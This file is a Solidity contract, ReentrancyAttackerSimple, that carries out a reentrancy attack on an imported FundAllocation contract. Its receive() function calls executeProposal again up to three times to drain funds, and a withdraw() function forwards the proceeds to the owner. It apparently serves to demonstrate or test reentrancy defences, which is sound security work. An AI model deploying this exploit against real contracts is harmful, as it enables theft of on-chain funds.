// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./FundAllocation.sol";

/**
 * @title ReentrancyAttackerSimple
 * @dev A simple contract to demonstrate reentrancy attacks
 */
contract ReentrancyAttackerSimple {
    FundAllocation public fundAllocation;
    uint public proposalId;
    uint public attackCount;
    address public owner;
    bool public attacking;
    
    event AttackAttempted(uint count, uint balance);
    event FundsReceived(uint amount, uint balance);
    event AttackCompleted(uint totalStolen, uint finalBalance);

    constructor(address payable _fundAllocation) {
        fundAllocation = FundAllocation(_fundAllocation);
        owner = msg.sender;
        attackCount = 0;
        attacking = false;
    }
    
    // Set the proposal ID to attack
    function setProposalId(uint _proposalId) public {
        require(msg.sender == owner, "Only owner can set proposal ID");
        proposalId = _proposalId;
    }
    
    // This is the function that will be called when the contract receives ETH
    receive() external payable {
        emit FundsReceived(msg.value, address(this).balance);
        
        // Only attempt reentrancy if we're not already attacking
        if (!attacking && attackCount < 3) {
            attacking = true;
            attackCount++;
            
            emit AttackAttempted(attackCount, address(this).balance);
            
            // Call back into the executeProposal function to exploit reentrancy
            try fundAllocation.executeProposal(proposalId) {
                // If successful, log it
                emit AttackCompleted(address(this).balance, address(this).balance);
            } catch Error(string memory reason) {
                // Log the error if the attack fails
                emit AttackCompleted(address(this).balance, address(this).balance);
            }
            
            attacking = false;
        }
    }
    
    // Withdraw funds to the owner
    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        uint amount = address(this).balance;
        (bool success, ) = owner.call{value: amount}("");
        require(success, "Withdrawal failed");
    }
    
    // Get the current balance of the contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
